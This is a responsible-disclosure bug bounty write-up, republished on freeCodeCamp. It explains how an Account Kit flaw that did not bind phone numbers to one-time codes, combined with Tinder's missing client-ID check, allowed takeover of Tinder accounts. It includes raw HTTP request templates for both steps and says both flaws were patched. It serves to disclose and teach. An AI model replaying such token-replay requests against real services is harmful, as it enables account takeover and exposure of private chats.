---
title: How I hacked Tinder accounts using Facebook’s Account Kit and earned $6,250
  in bounties
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2018-02-20T16:02:10.000Z'
originalURL: https://freecodecamp.org/news/hacking-tinder-accounts-using-facebook-accountkit-d5cc813340d1
coverImage: https://cdn-media-1.freecodecamp.org/images/1*vHP5HMwV-gHOYTtgVxYzfw.jpeg
tags:
- name: General Programming
  slug: programming
- name: Security
  slug: security
- name: startup
  slug: startup
- name: 'tech '
  slug: tech
- name: Web Development
  slug: web-development
seo_title: null
seo_desc: 'By AppSecure

  This is being published with the permission of Facebook under the responsible disclosure
  policy.

  The vulnerabilities mentioned in this blog post were plugged quickly by the engineering
  teams of Facebook and Tinder.

  This post is about an ...'
---

By AppSecure

This is being published with the permission of Facebook under the responsible disclosure policy.

The vulnerabilities mentioned in this blog post were plugged quickly by the engineering teams of Facebook and Tinder.

This post is about an account takeover vulnerability I discovered in Tinder’s application. By exploiting this, an attacker could have gained access to the victim’s Tinder account, who must have used their phone number to log in.

This could have been exploited through a vulnerability in Facebook’s Account Kit, **which Facebook has recently addressed.**

Both Tinder’s web and mobile applications allow users to use their mobile phone numbers to log into the service. And this login service is provided by Account Kit (Facebook).

![Image](https://cdn-media-1.freecodecamp.org/images/0*Pl2ybNU6xXSeKDeo.)
_Login Service Powered by Facebook’s Accountkit on Tinder_

The user clicks on **Login with Phone Number** on [tinder.com](http://tinder.com/) and then they are redirected to Accountkit.com for login. If the authentication is successful then Account Kit passes the access token to Tinder for login.

Interestingly, the Tinder API was not checking the **client ID** on the token provided by Account Kit.

This enabled the attacker to use any other app’s access token provided by Account Kit to take over the real Tinder accounts of other users.

### **Vulnerability Description**

[Account Kit](http://accountkit.com) is a product of Facebook that lets people quickly register for and log in to some registered apps by using just their phone numbers or email addresses without needing a password. It is reliable, easy to use, and gives the user a choice about how they want to sign up for apps.

[Tinder](http://tinder.com) is a location-based mobile app for searching and meeting new people. It allows users to like or dislike other users, and then proceed to a chat if both parties swiped right.

There was a vulnerability in Account Kit through which an attacker could have gained access to any user’s Account Kit account just by using their phone number. Once in, the attacker could have gotten ahold of the user’s Account Kit access token present in their cookies (aks).

After that, the attacker could use the access token (aks) to log into the user’s Tinder account using a vulnerable API.

### **How my exploit worked step-by-step**

#### Step #1

First the attacker would log into victim’s Account Kit account by entering the victim’s phone number in “**new_phone_number**” in the API request shown below.

Please note that Account Kit was not verifying the mapping of the phone numbers with their one-time password. The attacker could enter anyone’s phone number and then simply log into the victim’s Account Kit account.

Then the attacker could copy the victim’s “aks” access token of Account Kit app from cookies.

**The vulnerable Account Kit API:**

> _POST /update/async/phone/confirm/?dpr=2 HTTP/1.1_

> _Host: [www.accountkit.com](http://www.accountkit.com)_

> _new_phone_number=[vctim’s phone number]&update_request_code=c1fb2e919bb33a076a7c6fe4a9fbfa97[attacker’s request code]&confirmation_code=258822[attacker’s code]&__user=0&__a=1&__dyn=&__req=6&__be=-1&__pc=PHASED%3ADEFAULT&__rev=3496767&fb_dtsg=&jazoest=_

![Image](https://cdn-media-1.freecodecamp.org/images/0*f8qh3mB0PK71sZP_.)
_Image showing “aks” cookie on accountkit.com_

### Step #2

Now the attacker simply replays the following request using the copied access token “aks” of victim into the Tinder API below.

They will be logged into the victim’s Tinder account. The attacker would then basically have full control over the victim’s account. They could read private chats, full personal information, and swipe other user’s profiles left or right, among other things.

**Vulnerable Tinder API:**

> _POST /v2/auth/login/accountkit?locale=en HTTP/1.1_  
> _Host: **api.gotinder.com**_  
> _Connection: close_  
> _Content-Length: 185_  
> _Origin: [https://tinder.com](https://tinder.com)_  
> _app-version: 1000000_  
> _platform: web_  
> _User-Agent: Mozilla/5.0 (Macintosh)_  
> _content-type: application/json_  
> _Accept: */*_  
> _Referer: [https://tinder.com/](https://tinder.com/)_  
> _Accept-Encoding: gzip, deflate_  
> _Accept-Language: en-US,en;q=0.9_  
> _{“token”:”xxx”,”id”:””}_

### **Video Proof of Concept**

### **Timeline**

Both the vulnerabilities were fixed by Tinder and Facebook quickly. Facebook rewarded me with US $5,000, and Tinder awarded me with $1,250.

I’m the founder of [AppSecure](https://appsecure.in), a specialized cyber security company with years of skill acquired and meticulous expertise. We are here to safeguard your business and critical data from online and offline threats or vulnerabilities.

You can contact us at [anand.prakash@appsecure.in](mailto:anand.prakash@appsecure.in) or [sales@appsecure.in](mailto:sales@appsecure.in).

